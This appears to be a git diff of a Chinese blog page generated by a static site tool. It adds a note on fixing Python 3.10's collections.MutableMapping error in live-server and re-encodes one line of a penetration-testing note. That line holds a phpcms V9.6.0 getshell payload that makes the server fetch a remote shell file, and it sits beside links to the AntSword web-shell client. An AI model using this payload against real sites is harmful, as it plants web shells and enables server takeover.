@@ -2160,7 +2160,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-06-20 18:49:40" itemprop="dateModified" datetime="2022-06-20T18:49:40+08:00">2022-06-20</time>
+                <time title="修改时间：2022-06-24 14:56:19" itemprop="dateModified" datetime="2022-06-24T14:56:19+08:00">2022-06-24</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -2248,6 +2248,16 @@
 <p>保存，再输一遍，搞掂</p>
 <p><img src="https://img-blog.csdnimg.cn/11cae4aca04f4468b62c872f60c2a756.png#pic_center" alt="在这里插入图片描述"></p>
 <p>————————————————<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51092297/article/details/122889327">https://blog.csdn.net/weixin_51092297/article/details/122889327</a></p>
+<h1 id="AttributeError-module-‘collections‘-has-no-attribute-‘MutableMapping‘"><a href="#AttributeError-module-‘collections‘-has-no-attribute-‘MutableMapping‘" class="headerlink" title="AttributeError: module ‘collections‘ has no attribute ‘MutableMapping‘"></a>AttributeError: module ‘collections‘ has no attribute ‘MutableMapping‘</h1><p>情况说明<br>今天在装live server时遇到如下两个问题。</p>
+<p>module ‘collections’ has no attribute ‘MutableSet’<br>AttributeError: module ‘collections’ has no attribute ‘MutableMapping’<br>部分错误结果如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(py3_django4-<span class="number">0</span>-<span class="number">4</span>) lds@lishuaige:~/Desktop/meiduo/front_end$ live-server </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/bin/live-server&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> live_server.cli <span class="keyword">import</span> cli</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/cli.py&quot;</span>, line <span class="number">4</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> . <span class="keyword">import</span> watcher</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/watcher.py&quot;</span>, line <span class="number">7</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> . <span class="keyword">import</span> server</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/live_server/server.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">import</span> tornado.web</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/tornado/web.py&quot;</span>, line <span class="number">88</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> tornado <span class="keyword">import</span> httputil</span><br><span class="line">  File <span class="string">&quot;/home/lds/.local/lib/python3.10/site-packages/tornado/httputil.py&quot;</span>, line <span class="number">107</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">HTTPHeaders</span>(collections.MutableMapping):</span><br><span class="line">AttributeError: module <span class="string">&#x27;collections&#x27;</span> has no attribute <span class="string">&#x27;MutableMapping&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>解决方案<br>网上找了好多都是把问题贴出来然后就没下文了，琢磨了三四个小时幸亏解决了！！应该是python 3.10 那些 MutableMapping，MutableSet等放的位置变了，他们的上级模块原本直属collections的变成了abc，也就是说，需要把</p>
+<p><code>collections.MutableMapping</code><br>改成</p>
+<p><code>collections.abc.MutableMapping</code><br>那要怎么改呢？比如我这里报错，就点进源文件里面</p>
+<p><img src="https://img-blog.csdnimg.cn/06d7782d73f3445f89512dd4718ac967.png" alt="在这里插入图片描述"></p>
+<p>按上述方法修改即可。</p>
+<p><img src="https://img-blog.csdnimg.cn/fc4a64259d1944deb86a3b10fe39336a.png" alt="在这里插入图片描述"></p>
 
       
     </div>
@@ -2827,7 +2837,7 @@
 <p>脚本语言：php中间件：iis6.0，nginx；cms：phpcms V9.6.0</p>
 <p>漏洞利用文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/">http://blog.nsfocus.net/phpcms-v9-6-getshell-0day-vulnerability-analysis/</a></p>
 <p>​    —相关工具</p>
-<p>​       payload：[siteid&#x3D;1&amp;modelid&#x3D;11&amp;username&#x3D;saesvens1&amp;password&#x3D;ssevses&amp;mail&#x3D;<a href="mailto:&#x73;&#115;&#101;&#118;&#x65;&#110;&#115;&#x73;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#x73;&#115;&#101;&#118;&#x65;&#110;&#115;&#x73;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a>&amp;info[content]&#x3D; src&#x3D;<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
+<p>​       payload：[siteid&#x3D;1&amp;modelid&#x3D;11&amp;username&#x3D;saesvens1&amp;password&#x3D;ssevses&amp;mail&#x3D;<a href="mailto:&#115;&#115;&#x65;&#x76;&#101;&#110;&#x73;&#115;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#115;&#115;&#x65;&#x76;&#101;&#110;&#x73;&#115;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a>&amp;info[content]&#x3D; src&#x3D;<a target="_blank" rel="noopener" href="http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=">http://a-1253363006.cos.ap-chengdu.myqcloud.com/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</a></p>
 <p>​       中国蚁剑：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87517612">https://blog.csdn.net/qq1045553189/article/details/87517612</a></p>
 <p>​       蚁剑目录：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
 <p>​       加速器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a></p>
